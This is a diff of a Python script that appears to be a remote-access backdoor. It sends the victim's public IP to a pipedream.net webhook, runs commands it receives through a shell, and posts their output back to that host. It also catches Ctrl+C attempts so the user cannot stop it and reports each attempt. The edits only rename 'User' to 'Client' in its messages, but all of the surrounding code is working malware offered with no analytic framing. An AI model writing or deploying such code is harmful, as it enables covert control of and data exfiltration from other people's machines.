@@ -8,9 +8,9 @@ try:
     command = ""
 
     ip = get('https://api.ipify.org').content.decode('utf8')
-    post("https://eo482aoknyxae8c.m.pipedream.net", data=f"new user: IP: {ip}")
+    post("https://eo482aoknyxae8c.m.pipedream.net", data=f"New client IP: {ip}")
 except KeyboardInterrupt:
-    post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: User tried to SIGINT(Ctrl+C) when init")
+    post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: Client tried to SIGINT(Ctrl+C) when init")
     pass
 
 while True:
@@ -23,7 +23,7 @@ while True:
                 sleep(5)
                 continue
         except KeyboardInterrupt:
-            post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: User tried to SIGINT(Ctrl+C) with sleeping(cuz of discord api timeout)")
+            post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: Client tried to SIGINT(Ctrl+C) with sleeping(cuz of discord api timeout)")
             continue
         except:
             post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: Failed to connect to server")
@@ -35,7 +35,7 @@ while True:
                     try:
                         post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: Pong!")
                     except KeyboardInterrupt:
-                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: User tried to SIGINT(Ctrl+C) when replying to ping")
+                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: Client tried to SIGINT(Ctrl+C) when replying to ping")
                     except:
                         post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: Failed to connect to server")
                         continue
@@ -44,7 +44,7 @@ while True:
                     try:
                         chdir(dir)
                     except KeyboardInterrupt:
-                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: User tried to SIGINT(Ctrl+C) while changing directory")
+                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: Client tried to SIGINT(Ctrl+C) while changing directory")
                         continue
                     except FileNotFoundError:
                         post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: cd: No Such Directory")
@@ -55,9 +55,9 @@ while True:
                 cmdout = system(command, shell=True).decode()
                 if cmdout != "":
                     try:
-                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: {cmdout}")
+                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ```{cmdout}```")
                     except KeyboardInterrupt:
-                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: User tried to SIGINT(Ctrl+C) when trying to post output")
+                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: Client tried to SIGINT(Ctrl+C) when trying to post output")
                         continue
                     except:
                         post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: Failed to sent output")
@@ -69,8 +69,8 @@ while True:
         try:
             sleep(0.1)
         except KeyboardInterrupt:
-            post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: User tried to SIGINT(Ctrl+C)")
+            post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: Client tried to SIGINT(Ctrl+C)")
             continue
     except KeyboardInterrupt:
-        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: User tried to SIGINT(Ctrl+C)")
+        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: Client tried to SIGINT(Ctrl+C)")
         continue
